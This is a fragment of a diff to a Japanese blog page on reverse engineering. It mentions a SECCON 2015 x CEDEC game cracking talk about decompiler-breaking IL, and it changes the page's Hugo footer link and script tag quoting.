 <p>デコンパイラを殺すILは<a href="http://cedec.cesa.or.jp/2015/session/ENG/10405.html">SECCON 2015 x CEDEC CHALLENGE ゲームクラッキング＆チートチャレンジ</a>の発表で触れられていた内容です。</p>
-
 <p>落ちたら落ちたでそのとき考えます。</p>
 
                     </div>
@@ -824,11 +493,12 @@ IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、�
             <div class="footer">
     <div class="pure-menu pure-menu-horizontal pure-menu-open">
         <ul>
-            <li>Powered by <a class="hugo" href="http://hugo.spf13.com/" target="_blank">hugo</a></li>
+            <li>Powered by <a class="hugo" href="https://gohugo.io/" target="_blank">hugo</a></li>
         </ul>
     </div>
 </div>
-<script src="//blog.urandom.team/js/all.min.js"></script>
+<script src='//blog.urandom.team/js/all.min.js'></script>
+
         </div>
     </div>
 </div>
